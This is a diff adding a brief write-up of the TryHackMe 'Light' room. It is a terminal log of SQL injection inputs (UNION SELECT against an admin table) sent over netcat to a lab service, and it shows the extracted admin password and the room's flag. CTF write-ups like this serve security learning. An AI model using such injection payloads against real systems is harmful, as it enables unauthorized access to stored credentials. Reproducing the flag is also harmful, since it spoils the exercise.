@@ -1,0 +1,19 @@
+====================Light room tryhackme------------------------
+Link: https://tryhackme.com/room/lightroom
+Date: 11-02-2025
+Level: esay
+
+──(kali㉿kali)-[~/Desktop/rooms/light]
+└─$ nc 10.10.74.117 1337                                                                            
+Welcome to the Light database!
+Please enter your username: smokey'
+Error: unrecognized token: "'smokey'' LIMIT 30"
+Please enter your username: smokey' Union Select username FROM admintable WHERE username like '%
+Password: TryHackMeAdmin
+Please enter your username: TryHackMeAdmin
+Username not found.
+Please enter your username: smokey 'Union Select password FROM admintable WHERE username='TryHackMeAdmin                    
+Password: mamZtAuMlrsEy5bp6q17
+Please enter your username: mokey 'Union Select password FROM admintable WHERE username='flag
+Password: THM{SQLit3_InJ3cTion_is_SimplE_nO?}
+Please enter your username: ^C
